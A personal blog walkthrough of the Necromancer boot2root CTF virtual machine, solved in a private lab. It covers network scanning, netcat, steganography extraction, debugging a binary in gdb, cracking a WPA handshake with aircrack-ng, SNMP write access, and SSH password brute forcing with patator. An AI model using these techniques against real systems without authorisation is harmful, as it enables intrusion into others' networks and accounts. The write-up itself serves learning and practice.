---
layout: post
title:  "Exorcise the demons of the necromancer"
subtitle: "Curing the vulnerable machine from it's demons"
categories: [itsec]
---

Long time no post, I got kinda busy the last days. This post is again not about malware hunting, which means not that I don't hunt, I just cannot post about the last happenings and I also don't want to.
So I write about the next vulnerable operating system image which I resolved. 

![Necromancer](https://i.imgur.com/E42ZPDf.png)

Table of contents

* Will be replaced with the ToC, excluding the "Contents" header
{:toc}


The penetrating was sometimes really frustrating, but I enjoyed it. You had to analysis network, reverse engineer, crack and google information. Hard but nice trip. So let's start.

```
The Necromancer boot2root box was created for a recent SecTalks Brisbane CTF competition.

There are 11 flags to collect on your way to solving the challenging, and the difficulty level is considered as beginner.

The end goal is simple... destroy The Necromancer!
```

## Setup

I converted the image to a format which VMWare can read. I used [ovftools](https://my.vmware.com/group/vmware/details?downloadGroup=OVFTOOL410&productId=491) here. Please read the documentation on how to use it. Then I set it up on my ESXi as FeeBSD 32bit. Connected to an internal network.

There is also a small Debian server for DHCP and DNS functions. And there is Kali Linux which I'm using to resolve the quests.

That's the setup. Walk the path down now.

## Flag #1

First we have to find out where the system is located at (via IP). So do a discover scan:

```
root@kali:~# nmap -sP 10.0.0.0/24

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-24 23:03 CEST
Nmap scan report for 10.0.0.1
Host is up (0.00020s latency).
MAC Address: 00:50:56:65:6A:A8 (VMware)
Nmap scan report for 10.0.0.2
Host is up (0.00017s latency).
MAC Address: 00:0C:29:85:CF:BC (VMware)
Nmap scan report for 10.0.0.100
Host is up (0.000056s latency).
MAC Address: 00:0C:29:60:AA:78 (VMware)
Nmap scan report for 10.0.0.254
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 4.01 seconds
```

It's on `10.0.0.100` so port scan it:

```
root@kali:~# nmap -sS -sV 10.0.0.100

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-24 23:05 CEST
Nmap scan report for 10.0.0.100
Host is up (0.00026s latency).
All 1000 scanned ports on 10.0.0.100 are filtered
MAC Address: 00:0C:29:60:AA:78 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.52 seconds
```

No open ports, I also tested several other techniques, but they remain closed. 

First time to while doing this CTF to think about it. So this VM has no open ports but we have to gain access to it, via network. Hmm :pensive:

What if it's the other side? What if the VM sends data? So let's start Wireshark and test it.

![Wireshark](https://i.imgur.com/m0zu538.png)

We see that the **necromancer** VM tries to connect to us on port 4444 with TCP protocol. It's initiating a handshake sequence (which TCP connections normally do). Let's listen on `:444`:

```
root@kali:~/necromancer# nc -l -vv -p 4444
listening on [any] 4444 ...
10.0.0.100: inverse host lookup failed: Unknown host
connect to [10.0.0.254] from (UNKNOWN) [10.0.0.100] 45822
...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi...

 sent 0, rcvd 1424
```

Worked and we received some data. It looks like *base64* to me, so test to decode it:

```
root@kali:~/necromancer# echo "V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi" | base64 -d
Welcome!

You find yourself staring towards the horizon, with nothing but silence surrounding you.
You look east, then south, then west, all you can see is a great wasteland of nothingness.

Turning to your north you notice a small flicker of light in the distance.
You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  

The air around you begins to get thicker, and your heart begins to beat against your chest. 
You turn to your left.. then to your right!  You are trapped!

You fumble through your pockets.. nothing!  
You look down and see you are standing in sand.  
Dropping to your knees you begin to dig frantically.

As you dig you notice the barrier extends underground!  
Frantically you keep digging and digging until your nails suddenly catch on an object.

You dig further and discover a small wooden box.  
flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.

You open the box, and find a parchment with the following written on it. "Chant the string of flag1 - u666"
```

The first flag was obtained and I bet it's *md5*. Let's try to resolve it here: [hashkiller.co.uk](https://hashkiller.co.uk/md5-decrypter.aspx). It resolved to 

> opensesame



## Flag #2

And when you look further, in the text is a hint written: 

> "Chant the string of flag1 - u666"

I think we have to send the string to port 666 on UDP of the machine:

```
root@kali:~/necromancer# nc -uv 10.0.0.100 666
10.0.0.100: inverse host lookup failed: Unknown host
(UNKNOWN) [10.0.0.100] 666 (?) open
opensesame


A loud crack of thunder sounds as you are knocked to your feet!

Dazed, you start to feel fresh air entering your lungs.

You are free!

In front of you written in the sand are the words:

flag2{c39cd4df8f2e35d20d92c2e44de5f7c6}

As you stand to your feet you notice that you can no longer see the flicker of light in the distance.

You turn frantically looking in all directions until suddenly, a murder of crows appear on the horizon.

As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.

The birds get closer, and closer, and closer.

Staring up at the crows you can see they are in a formation.

Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.

As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.

666 is closed.
```

Flag 2 is:

> 1033750779

There is a hint with the number, I think it could also be a port, as the last hint was also containing a port number.

## Flag #3



![](https://i.imgur.com/VAKe9Ql.png)

Yep, it worked. I looked in the source code of the site, but there where no useful hints etc. So let's focus on the image and download it.

```
root@kali:~/necromancer# file pileoffeathers.jpg 
pileoffeathers.jpg: JPEG image data, Exif standard: [TIFF image data, little-endian, direntries=0], baseline, precision 8, 640x290, frames 3
root@kali:~/necromancer# LANG=C exif pileoffeathers.jpg 
EXIF tags in 'pileoffeathers.jpg' ('Intel' byte order):
--------------------+----------------------------------------------------------
Tag                 |Value
--------------------+----------------------------------------------------------
X-Resolution        |72
Y-Resolution        |72
Resolution Unit     |Inch
Exif Version        |Exif Version 2.1
FlashPixVersion     |FlashPix Version 1.0
Color Space         |Internal error (unknown value 65535)
--------------------+----------------------------------------------------------
```

Looks like an image, but look at the color space, it has an unknown value. So maybe it's more than an image. Let's check the strings.

![Hex view](https://i.imgur.com/2zVswMT.png)

I guess there is something embedded (`feathers.txt`):

```
root@kali:~/necromancer# unzip -t pileoffeathers.jpg
Archive:  pileoffeathers.jpg
warning [pileoffeathers.jpg]:  36994 extra bytes at beginning or within zipfile
  (attempting to process anyway)
    testing: feathers.txt             OK
No errors detected in compressed data of pileoffeathers.jpg.
```

Let's unpack it:

```
root@kali:~/necromancer# unzip pileoffeathers.jpg
Archive:  pileoffeathers.jpg
warning [pileoffeathers.jpg]:  36994 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  inflating: feathers.txt            
root@kali:~/necromancer# ls
feathers.txt  pileoffeathers.jpg
root@kali:~/necromancer# cat feathers.txt 
ZmxhZzN7OWFkM2Y2MmRiN2I5MWMyOGI2ODEzNzAwMDM5NDYzOWZ9IC0gQ3Jvc3MgdGhlIGNoYXNtIGF0IC9hbWFnaWNicmlkZ2VhcHBlYXJzYXR0aGVjaGFzbQ==
root@kali:~/necromancer# cat feathers.txt | base64 -d
flag3{9ad3f62db7b91c28b68137000394639f} - Cross the chasm at /amagicbridgeappearsatthechasm
```

Hooray :smiley:, we found the next flag! It resolves to

> 345465869

Hmm, a number, okay :thinking:

And a new hint, looks like part of a URI. Time to navigate to that.

## Flag #4

The site showed that:

![](https://i.imgur.com/VTCtIXE.png)

That was one of the hard parts of the CTF. I thought about it a long while. But then I mentioned the hint:

> There must be a magical item that could protect you from the necromancer's spell. 

A "*magical item*". Hmmmm. :thinking:

`index.php` gave a *404*. But could also a *mod_rewrite*. Maybe directory brute forcing would help as it did before with vulnOS's. I searched a website with words of magic items and found a forum post. Then I used **cewl** to create a wordlist:

```
root@kali:~/tools/dirsearch# cewl -v -w magic.txt -d 1 http://www.giantitp.com/forums/showsinglepost.php?p=10400652&postcount=1
cat magic.txt | tr a-z A-Z > magic_upper.txt; cat magic.txt | tr A-Z a-z > magic_lower.txt; cat magic_* >> magic.txt; rm magic_*
```

The last comment was to also create lower- and uppercase variations of the words and include them in the wordlist. Let's let **dirsearch** do the job:

```
root@kali:~/tools/dirsearch# ./dirsearch.py -u "http://10.0.0.100/amagicbridgeappearsatthechasm/" -e php -x 404,500,403 -w ~/tools/magic.txt -t 16

 _|. _ _  _  _  _ _|_    v0.3.7
(_||| _) (/_(_|| (_| )

Extensions: php | Threads: 16 | Wordlist size: 10314

Error Log: /root/tools/dirsearch/logs/errors-16-09-29_22-35-48.log

Target: http://10.0.0.100/amagicbridgeappearsatthechasm/

[22:35:48] Starting: 
[22:35:59] 200 -    9KB - /amagicbridgeappearsatthechasm/talisman

Task Completed
```

And then things went even worse. I downloaded **talisman**. It was a binary ELF file for x86 architecture (aka 32bit). I added the architecture to my amd64 Kali Linux:

```
sudo dpkg --add-architecture i386
sudo apt-get install libXX:i386
```

Reading the info from the ELF:

```
root@kali:~/necromancer# readelf -h talisman 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048350
  Start of program headers:          52 (bytes into file)
  Start of section headers:          8436 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           40 (bytes)
  Number of section headers:         31
  Section header string table index: 28
```

When running it:

```
root@kali:~/necromancer# ./talisman
You have found a talisman.

The talisman is cold to the touch, and has no words or symbols on it's surface.

Do you want to wear the talisman?  yes

Nothing happens.
```

I tried to search for useful strings inside the ELF, but no change, the strings where somehow protected. Kinda written to memory at runtime.

I looked at the `sym.main` call in **radare2**:

![](https://i.imgur.com/FzkQTtm.png)

We see that `sym.wearTalisman` get's called, and then it ends with a `return`.
At the called function was that:

![](https://i.imgur.com/SGcNESa.png)

There was also a function to read the strings, but it was protected with **XOR** . And I'm really not good in cracking these.

So I put the VM away, for a whole day.

.....

### The story continues

Well, with static analysis I did not get far, so why not dynamic analysis and debug this ELF? I mainly did that on Windows with **ollydbg**. But this was Linux, and this was not a *PE*.

According to [that](http://www.dirac.org/linux/gdb/04-Breakpoints_And_Watchpoints.php) I read about how to set breakpoints. But that did not get me further.
The file was not stripped during compiling, so some compiling information was still present. Also the function names remained the same as they are named in the source file. So I read [this thread](http://stackoverflow.com/questions/10680670/ask-gdb-to-list-all-function-in-a-program). And it got me on the right trail! :godmode:

```
gdb$ info functions
All defined functions:

Non-debugging symbols:
0x080482d0  _init
0x08048310  printf@plt
0x08048320  __libc_start_main@plt
0x08048330  __isoc99_scanf@plt
0x08048350  _start
0x08048380  __x86.get_pc_thunk.bx
0x08048390  deregister_tm_clones
0x080483c0  register_tm_clones
0x08048400  __do_global_dtors_aux
0x08048420  frame_dummy
0x0804844b  unhide
0x0804849d  hide
0x080484f4  myPrintf
0x08048529  wearTalisman
0x08048a13  main
0x08048a37  chantToBreakSpell
0x08049530  __libc_csu_init
0x08049590  __libc_csu_fini
0x08049594  _fini
```

Wohoo, see the function at `0x08048a37`? `chantToBreakSpell`. This function got not called anywhere in the binary! And according to [that](https://www.sourceware.org/ml/gdb/1999-q4/msg00257.html) I can use `call` to run a function.

```
gdb$ b main
Breakpoint 1 at 0x8048a21
gdb$ call chantToBreakSpell()
You can't do that without a process to debug.
gdb$ run
Starting program: /root/necromancer/talisman 
--------------------------------------------------------------------------[regs]
  EAX: 0xF7FB0DBC  EBX: 0x00000000  ECX: 0xFFFFD3A0  EDX: 0xFFFFD3C4  o d I t S z a P c 
  ESI: 0xF7FAF000  EDI: 0xF7FAF000  EBP: 0xFFFFD388  ESP: 0xFFFFD384  EIP: 0x08048A21
  CS: 0023  DS: 002B  ES: 002B  FS: 0000  GS: 0063  SS: 002B
--------------------------------------------------------------------------[code]
=> 0x8048a21 <main+14>:	sub    esp,0x4
   0x8048a24 <main+17>:	call   0x8048529 <wearTalisman>
   0x8048a29 <main+22>:	mov    eax,0x0
   0x8048a2e <main+27>:	add    esp,0x4
   0x8048a31 <main+30>:	pop    ecx
   0x8048a32 <main+31>:	pop    ebp
   0x8048a33 <main+32>:	lea    esp,[ecx-0x4]
   0x8048a36 <main+35>:	ret    
--------------------------------------------------------------------------------

Breakpoint 1, 0x08048a21 in main ()
gdb$ call chantToBreakSpell()
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
You fall to your knees.. weak and weary.
Looking up you can see the spell is still protecting the cave entrance.
The talisman is now almost too hot to touch!
Turning it over you see words now etched into the surface:
flag4{ea50536158db50247e110a6c89fcf3d3}
Chant these words at u31337
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
$1 = 0xffffd072
```

Oh YES YES YES. There it is, the flag. And cracked it is:

> blackmagic

Yup, this really was black magic.

## Flag 5

The hint

> Chant these words at u31337

was pointing to it. Again we have to send a string to a port of the machine via UDP.

```
root@kali:~/necromancer# nc -u 10.0.0.100 31337
blackmagic


As you chant the words, a hissing sound echoes from the ice walls.

The blue aura disappears from the cave entrance.

You enter the cave and see that it is dimly lit by torches; shadows dancing against the rock wall as you descend deeper and deeper into the mountain.

You hear high pitched screeches coming from within the cave, and you start to feel a gentle breeze.

The screeches are getting closer, and with it the breeze begins to turn into an ice cold wind.

Suddenly, you are attacked by a swarm of bats!

You aimlessly thrash at the air in front of you!

The bats continue their relentless attack, until.... silence.

Looking around you see no sign of any bats, and no indication of the struggle which had just occurred.

Looking towards one of the torches, you see something on the cave wall.

You walk closer, and notice a pile of mutilated bats lying on the cave floor.  Above them, a word etched in blood on the wall.

/thenecromancerwillabsorbyoursoul

flag5{0766c36577af58e15545f099a3b15e60}
```

And the next flag was obtained, this time it resolved to

> 809472671

Again some numbers, if they might help us later?

## Flag 6

The last text gave us another hint: `/thenecromancerwillabsorbyoursoul`, so let's open that URL:

![](https://i.imgur.com/2phmj8s.png)

Next flag obtained! It resolves to:

> 1756462165



## Flag 7

The site is containing a file to download and a hint:

> Looking closer at the skull, you can see u161 engraved into the forehead.

Seems like the next UDP driven port to where we have to send a request. But lets focus on the downloaded file first.

```
root@kali:~/necromancer# file necromancer 
necromancer: bzip2 compressed data, block size = 900k
root@kali:~/necromancer# bunzip2 necromancer
bunzip2: Can't guess original name for necromancer -- using necromancer.out
root@kali:~/necromancer# file necromancer.out 
necromancer.out: POSIX tar archive (GNU)
root@kali:~/necromancer# tar xfv necromancer.out 
necromancer.cap
```

A network capture file. This seems interesting. Let's open it in **Wireshark**

![](https://i.imgur.com/EKcle1y.png)

We see here *IEEE 802.11* WiFi traffic. And that there is a [beacon frame](https://en.wikipedia.org/wiki/Beacon_frame) for the SSID `community`. Scrolling further we see also some *[deauth](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack)* packets. Let's see if we see also a captured handshake.

![](https://i.imgur.com/cIArqxs.png)

Yep, we do. Now we have to break it.

I am using the `rockyou.txt` wordlist as it has a good success ratio. We need also the *BSSID* of the Access Point. Look into the packet and see for the *QoS Data*, you will find it there. The BSSID here is `c4:12:f5:0d:5e:95`.

With used command:

```
aircrack-ng -b c4:12:f5:0d:5e:95 -w rockyou.txt necromancer.cap
```



![](https://i.imgur.com/LOM6gF6.png)

We have the password! Let's send that to the mentioned port from before.

```
# nc -u -v 10.0.0.100 161
10.0.0.100: inverse host lookup failed: Unknown host
(UNKNOWN) [10.0.0.100] 161 (snmp) open
death2all
```

Okay, that was a fail. Nothing happens. Would be too easy, eh :grinning:

Let's look at the protocol, **SNMP**. Kali has a tool included to check a *SNMP* service: [snmpcheck](http://tools.kali.org/information-gathering/snmpcheck). So:

```
root@kali:~/necromancer# snmpcheck -t 10.0.0.100
test: .1.3.6.1.4.1.2021.2.1
suff: .2.1
test: .1.3.6.1.4.1.2021.4
suff: 
test: .1.3.6.1.4.1.2021.8.1
suff: .8.1
test: .1.3.6.1.4.1.2021.9.1
suff: .9.1
test: .1.3.6.1.4.1.2021.10.1
suff: .10.1
test: .1.3.6.1.4.1.2021.101
suff: 
Created directory: /var/lib/snmp/mib_indexes
No community name specified.
```

> No community name specified.

Hmm, ok. What is that? According to [that](https://community.helpsystems.com/knowledge-base/intermapper/snmp/snmp-community-strings/) it's somehow a password. Feed it with that. But again an error. Let's just simply use `snmpwalk` instead of `snmpcheck`:

```
root@kali:~/necromancer# snmpwalk -c death2all -v 2c 10.0.0.100
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

Ok, we have some info. There is a next hint:

>iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"

Looks like an SNMP OID. And `death2allrw`. `rw`? Read and write? Let's try to set it on that OID:

```
root@kali:~/necromancer# snmpset -c death2allrw 10.0.0.100 iso.3.6.1.2.1.1.6.0 s Unlocked
snmpset: No securityName specified
root@kali:~/necromancer# snmpset -c death2allrw -v 1 10.0.0.100 iso.3.6.1.2.1.1.6.0 s Unlocked
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
```

Version 1 don't need a `securityName`. Tickle it again:

```
root@kali:~/necromancer# snmpwalk -c death2all -v 2c 10.0.0.100
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
```

There we are! The next flag was obtained. And resolves to:

> demonslayer

That as a really hard flag, kinda! Let's walk on to gain the next.



## Flag 8-10

The last hint was `t22`. So, TCP on 22? Is **SSH** finally open? Checking it:

```
root@kali:~/necromancer# nmap -sS -sV 10.0.0.100

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-10-01 21:20 CEST
Nmap scan report for 10.0.0.100
Host is up (0.00023s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2 (protocol 2.0)
MAC Address: 00:0C:29:60:AA:78 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.25 seconds
```

Wohoo, it's open :feelsgood:

```
root@kali:~/necromancer# ssh root@10.0.0.100
The authenticity of host '10.0.0.100 (10.0.0.100)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.0.100' (ECDSA) to the list of known hosts.
root@10.0.0.100's password: 
Permission denied, please try again.
root@10.0.0.100's password: 
```

Login with `root` password `demonslayer` was false. Maybe `demonslayer` is the username? But what is the password? Let's ask `rockyou.txt`:

```
root@kali:~/necromancer# patator ssh_login host=10.0.0.100 port=22 user=demonslayer password=FILE0 0=rockyou.txt -x ignore:mesg='Authentication failed.'
16:49:07 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2016-10-08 16:49 CEST
16:49:09 patator    INFO -                                                                              
16:49:09 patator    INFO - code  size   time | candidate                          |   num | mesg
16:49:09 patator    INFO - -----------------------------------------------------------------------------
16:49:11 patator    INFO - 0     19    0.633 | 12345678                           |     9 | SSH-2.0-OpenSSH_7.2
^C16:49:13 patator    INFO - Hits/Done/Skip/Fail/Size: 1/101/0/0/14344391, Avg: 21 r/s, Time: 0h 0m 4s
16:49:13 patator    INFO - To resume execution, pass --resume 13,7,11,9,11,12,9,8,9,12
```

Password is found, it's `12345678`. Access the machine:

```
root@kali:~/necromancer# ssh demonslayer@10.0.0.100
demonslayer@10.0.0.100's password: 

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

$ id
uid=1000(demonslayer) gid=1000(demonslayer) groups=1000(demonslayer)
$ ls
flag8.txt
$ cat flag8.txt                                                                                                                                                                                You enter the Necromancer's Lair!
A stench of decay fills this place.  
Jars filled with parts of creatures litter the bookshelves.
A fire with flames of green burns coldly in the distance.
Standing in the middle of the room with his back to you is the Necromancer.  
In front of him lies a corpse, indistinguishable from any living creature you have seen before.
He holds a staff in one hand, and the flickering object in the other.
"You are a fool to follow me here!  Do you not know who I am!"
The necromancer turns to face you.  Dark words fill the air!
"You are damned already my friend.  Now prepare for your own death!" 
Defend yourself!  Counter attack the Necromancer's spells at u777!
$ 
```

Port 777 on UDP, shall we also connect to there?

```
root@kali:~# nc -v -u 10.0.0.100 777
10.0.0.100: inverse host lookup failed: Unknown host
(UNKNOWN) [10.0.0.100] 777 (?) open
.
```

Nothing happens. If you scroll up, after every step the port got closed. But 22 remains open. Maybe we have to connect to 777 there?

```
$ whereis nc
/usr/bin/nc
$ nc -u localhost 777
.

** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?
```

A riddle? Let's see what happens when you fail.

```
** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path? 


** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path? 


** You only have 1 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  


** You only have 0 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  

!!!!!!! You have been defeated by The Necromancer! (*_*) !!!!!!!

Connection to 10.0.0.100 closed by remote host.
Connection to 10.0.0.100 closed.
```

Damnit, the port got closed, my SSH session got closed and it seems that I have to do all the tasks again. Let's redo this walkthrough then.

Let's use Google then:

```
$ nc -u localhost 777
.


** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path?  Kelewan


flag8{55a6af2ca3fee9f2fef81d20743bda2c}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who did Johann Faust VIII make a deal with?  Mephistopheles


flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}

A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.

^C
```

First answer can be found at [this](https://en.wikipedia.org/wiki/Tsurani#Great_Ones) Wikipedia article. The second answer is known to everyone who read **Faust**. I had to read it in school, you maybe, too. If not, read it! It's a really nice story. Third answer can be found [here](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters#Hedge).

